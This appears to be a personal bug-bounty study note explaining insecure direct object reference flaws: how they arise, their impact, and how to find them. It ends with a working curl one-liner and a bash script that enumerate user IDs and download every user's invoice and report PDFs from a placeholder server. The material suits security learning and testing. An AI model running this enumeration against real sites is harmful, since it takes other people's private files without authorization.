---
{"dg-publish":true,"permalink":"/cybersecurity/bug-bounties/insecure-direct-object-reference/","tags":["IDOR"]}
---

Also IDOR. Among the most common web vulnerabilities and can lead to unauthorized data access. They occur when a web application exposes a **direct reference** to an object, like a file or database resource.

This is prevalent because of lack of solid access control on the back end and exposure of direct reference to feils and resources. (e.g., if the application exposes information that suggest there is a sequential number used for labeling files.)

For example a user may get a link that goes to download.php?file_id=123.  This link directly references the file. If the user changes the link to ...file_id=124 this may access another file if there are not proper access control systems on the back-end.

The direct object reference on its own isn't a vulnerability, but it is a potential exploit when llinked with a weak access control system. This is the main takeaway. Good back-end access control esystems exist. A user with direct references to back-end objets shouldn't have the authorization to access them anyway.

But often developers ignore building the necessary access control system. This means that the web applications and mobile applications are unportected on the back and and vulnerable to direct object references.

## Impact of IDOR Vulnerabilities

The most basic is access to private files or other resources such as personal files or credit card data. This is known as IDOR Information disclosure vulnerabilities.

IDOR Vulnerabilities may also lead to the elevation of user privileges from a standard user to an administrator user with IDOR Insecure Function Calls.

## Identifying IDORS

### URL Parameters & APIs

Whenever we get a resource or file, look at the request looking for URL Parameters or APIs with an object reference. (?uid=1 or ?filename=file_1.pdf)

### [[Cybersecurity/Bug Bounties/AJAX\|AJAX]] Calls

We may also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls.

### Understand Hasing\/Encoding

Some websites will hash or encode the simple sequential numbers they use. If the encoding is something simple like base64, then we can try encoding different payloads with base64. If it is a hash function then we may find clues as to the hash used in the source code (if we can find it.)

### Compare User Roles

For more advanced IDOR attacks, use multiple registered users and compare their HTTP requests and object references.

## Mass IDOR Enumeration

### Insecure Paramters

Assume we know that a user has uid=1. If we see a folder that contains:
```
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```
We might conclude that there is a pattern \[uid\]\_month\_year.pdf that allows us to search for other files.

This is called a **static file IDOR**. 

We might also try changing the uid to see if that gives us other documents. It is common for web apps to suffer from IDOR vulnerabilities.

Once we see this kind of pattern, we can write a bash script to get all of the files. First we find the html for the links on the page:
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```
Then we curl the page and get the portion of the returned html that lists the documents:
```shell-session
user@computer $ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```
And write a bash script to wget all of them:
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

